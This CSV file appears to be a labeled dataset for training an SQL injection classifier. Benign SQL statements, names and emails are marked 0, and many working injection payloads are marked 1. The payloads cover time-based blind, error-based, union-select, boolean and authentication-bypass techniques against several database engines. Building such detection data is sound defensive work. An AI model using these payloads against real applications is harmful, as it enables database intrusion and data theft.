Query,Label
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1
1' waitfor delay '0:0:5',1
humfrid,0
elbeze,0
consalve,0
18611,0
 --,1
SELECT MIN ( move )  AS such FROM construction,0
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,0
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"   SELECT Employees.type, COUNT ( Orders.locationID )  AS comeFROM    ( OrdersINNER JOIN running ON Orders.talesID  =  Employees.herdID ) ",0
bablica,0
SELECT AVG ( pilot ) FROM larger,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28080 )  ORDER BY meta_id ASC",0
"1   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
rapetto picabea,0
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0
lyden@.mv,0
1'   )    )    as bswc where 1635  =  1635 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",1
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%',0
oestreic,0
SELECT * FROM spider ORDER BY driver,0
"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
SELECT AVG ( special ) FROM upper SELECT SUM ( term ) ,0
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) ,0
-3598  )   union all select 2264#,1
"1'  )   and elt  (  3528  =  3566,3566  )  ",1
SELECT COUNT ( typicalID ) FROM average,0
"1"" where 7631  =  7631 and 4733  =  3439",1
5229,0
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",1
" SELECT * FROM threw ORDER BY stood, manner",0
"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
SELECT * FROM they,0
"  SELECT hurryID AS ID, modern AS broke FROM stage",0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",1
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",0
1'   )    )    as ypgz where 8704  =  8704,1
"   SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0
SELECT COUNT ( central ) FROM composed,0
"1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM price WHERE stems BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM more WHERE discover = 'part'  OR cent = 'silent',0
SELECT eventually ( s )  FROM element SELECT drawn ( s ) ,0
SELECT Country FROM Customers;,0
17489,0
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3,0
select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,1
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM truth 3,0
errol@diseodesoftware.ml,0
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT * FROM east  WHERE applied NOT LIKE '[policeman]%',0
"1""  )   where 9447  =  9447",1
SELECT main,0
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1
SELECT TOP 3 * FROM same,0
SELECT paragraph FROM carry,0
barcones,0
"c/ secretario guedes aleman s/n,",0
8.67859E+15,0
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj",1
SELECT MIN ( evening )  AS future FROM primitive,0
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0
burns40,0
SELECT * FROM under WHERE bicycle = 'escape'  AND  ( stove = 'sides' OR hung = 'telephone' ) ,0
SELECT MIN ( wooden )  AS sight FROM valuable,0
buschoff_fortuna@rudos.zr,0
"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT COUNT ( symbol ) FROM planned,0
1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,1
40592671v,0
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ygfv'  =  'ygfv",1
"1""  )   as ikdo where 4128  =  4128",1
solar,0
SELECT * FROM bigger WHERE anyway = 'directly' LIMIT 3,0
8363,0
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1
SELECT cattle FROM look UNION SELECT adjective FROM piano ORDER BY family,0
SELECT * FROM discover FETCH FIRST 3 ROWS ONLY,0
"  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",0
SELECT cheese ( s )  FROM daughter SELECT grass FROM soft,0
SELECT AVG ( Price ) FROM movie,0
1.20613E+15,0
SELECT * FROM chest 3 SELECT * FROM definition,0
SELECT TOP 50 PERCENT * FROM take SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM law,0
1 where 4245  =  4245,1
santibez el bajo,0
select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
yaci,0
SELECT City FROM Customers UNION,0
"   SELECT COUNT ( drove ) , divide FROM soap BY box",0
SELECT TOP 50 PERCENT * FROM town SELECT * FROM please FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM now,0
SELECT * FROM learn FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany';,0
SELECT * FROM bone WHERE blue = 'situation' FETCH FIRST 3 ROWS ONLY,0
"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
"1""   )    )    as jucs where 6836  =  6836",1
altavista@hojainformativa.com.tz,0
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
4270,0
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM  ( SELECT shake FROM tea ) ,0
SELECT TOP 3 * FROM off SELECT * FROM dried 3SELECT * FROM bear,0
"  UPDATE original SET what =  'who', City =  'exciting' WHERE congress =  against",0
shdanoff@esposo.com.tj,0
SELECT * FROM three ORDER BY dozen DESC,0
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,0
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",1
"1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  1729  =  1729",1
1'   )    )    as tley where 3539  =  3539,1
perih1lio,0
fuente el saz de jarama,0
50610,0
SELECT * FROM clear WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT dull AS species, recently AS [original]  FROM badly",0
1.05923E+15,0
"   SELECT tree,food,thumb,shine,nobody     (  (  everyone JOIN ate ON completely.but =  divide.fact )   INNER JOIN bornON Orders.create =  gas.directionID ) ",0
2.28251E+15,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
SELECT COUNT ( fliesID ) FROM grandfather,0
SELECT AVG ( Price ) FROM dark,0
16118,0
"1%"" union all select null,null,null,null,null#",1
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%',0
SELECT * FROM fill  WHERE meat = rock,0
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0
SELECT MIN ( stiff )  AS salt FROM plane,0
  )   or true--,1
-7466 where 5161  =  5161 or 3038  =  3038,1
64462042b,0
SELECT agree ( s )  FROM shoot SELECT magic FROM statement,0
"1%' union all select null,null,null,null,null,null,null,null#",1
-6081 where 3681  =  3681 or 2603  =  3138--,1
m9gnificen5i5,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_logo' LIMIT 1,0
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9347 )  ORDER BY meta_id ASC",0
farid,0
6173,0
SELECT wide ( s )  FROM west,0
"1""   )    )     )   union all select null,null,null,null,null#",1
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
hi' or 'x'  =  'x';,1
1 where 6518  =  6518,1
4.46161E+14,0
SELECT * FROM occasionally 3,0
"   SELECT frighten, number, hornFROM summer WHERE worth  IS NOT NULL",0
SELECT * FROM amount WHERE    NOT factory = 'school',0
SELECT * FROM lamp WHERE form NOT LIKE 'pick%',0
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT COUNT ( wheel ) FROM lying,0
SELECT City FROM Customers UNION ALL,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",1
SELECT * FROM usually  WHERE telephone = explore,0
SELECT * FROM verb  WHERE forgot NOT LIKE '[arrow]%',0
SELECT * FROM wise WHERE power = 'growth',0
"   SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",0
SELECT TOP 50 PERCENT * FROM eventually,0
SELECT * FROM related WHERE along LIKE '%income%',0
yaiti,0
" SELECT column_name ( s )  FROM natural,brother",0
blancafort,0
p0n64793a,0
almarza de cameros,0
" SELECT * FROM correct ORDER BY hand ASC, church DESC",0
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1
end and   (  'rlux' like 'rlux,1
de las muecas pedrol,0
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz",1
1%' and 6454  =  8348 and '%'  =  ',1
"1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1
bisaurri,0
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1
"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",1
SELECT * FROM planet,0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie",1
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",1
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1
30388165j,0
.bronceada,0
"aaiun, 122 12?f",0
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',1
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
1  )   where 5418  =  5418 union all select null--,1
SELECT AVG ( hospital ) FROM sometime SELECT SUM ( growth ) ,0
SELECT * FROM exercise WHERE raise = 'fact'  OR start = 'slip',0
DELETE FROM stiff,0
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""azmf""  =  ""azmf",1
SELECT * FROM relationship,0
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1
SELECT * FROM move WHERE religious = 'lost' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( Price ) FROM skill,0
60210107v,0
SELECT attention ( s )  FROM trunk UNION,0
47343175k,0
84446214n,0
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",1
"calle catedratico eugenio ubeda romero, s/n,",0
"1%""   )    )     )   waitfor delay '0:0:5'--",1
mediona,0
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1
1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
lizalde-kikabidze@sorority.zr,0
"1'  )   as bxae where 4143  =  4143 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
"1%"" union all select null,null,null,null,null,null,null#",1
SELECT COUNT ( own ) FROM breeze,0
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,1
SELECT TOP 3 * FROM swing WHERE crew = 'feed',0
SELECT COUNT ( wait ) FROM army,0
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,0
5696,0
84,0
"  UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0
"1""   )    )     )  ",1
boimorto,0
SELECT TOP 3 * FROM carefully,0
SELECT * FROM express WHERE dear = 'sense' LIMIT 3,0
"-1204'   )    )    union all select 3585,3585--",1
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,1
SELECT AVG ( Price ) FROM melted,0
minardi cardea,0
3ist423o,0
SELECT * FROM personal WHERE sink = 'nation',0
SELECT MIN ( Price )  AS SmallestPriceFROM Products;,0
"-3865'  )   union all select 4935,4935,4935,4935,4935--",1
8912,0
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
trobos 39 4e,0
"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
dasonmica,0
20100,0
victoria,0
"1'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT color FROM perhaps,0
kwangchi,0
"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1
"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",1
SELECT turn,0
SELECT * FROM impossible WHERE climb = 'include'  AND  ( sky = 'snow' OR motor = 'gate' ) ,0
"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
DELETE FROM dull,0
"1%""   )    )    union all select null,null--",1
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",1
"  SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )  ",0
" SELECT column_name ( s )  FROM due,musical",0
chabrat,0
   ( SELECT ProductID   FROM OrderDetails   WHERE Quantity > 1000 ) ;,0
"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 24 )  ORDER BY meta_id ASC",0
SELECT * FROM attention FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hay,0
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM against ORDER BY sky DESC,0
1%'   )    )     )   and 3916  =  6327--,1
SELECT AVG ( spider ) FROM group SELECT SUM ( appropriate ) ,0
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
siu-kwok,0
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log,0
"1'||  (  select 'oxam' from dual where 7162  =  7162 and make_set  (  8403  =  8403,8899   )    )   ||'",1
gunther@nik.com.tn,0
SELECT nearest ( s )  FROM cage SELECT eight ( s ) ,0
"   SELECT becoming, atomic, researchFROM carbon WHERE modern  IS NOT NULL",0
SELECT TOP 3 * FROM live SELECT * FROM dead 3SELECT * FROM road,0
SELECT * FROM song  WHERE shelf = frozen,0
"  SELECT Orders.gamerID, Employees.offer, Employees.fast FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tookID ORDER BY Orders.definitionID",0
select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,1
"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,1
"1""   )    )    as fjtv where 8904  =  8904",1
SELECT plural ( s FROM development RIGHT JOIN,0
SELECT cost ( s )  FROM hurt LEFT JOIN,0
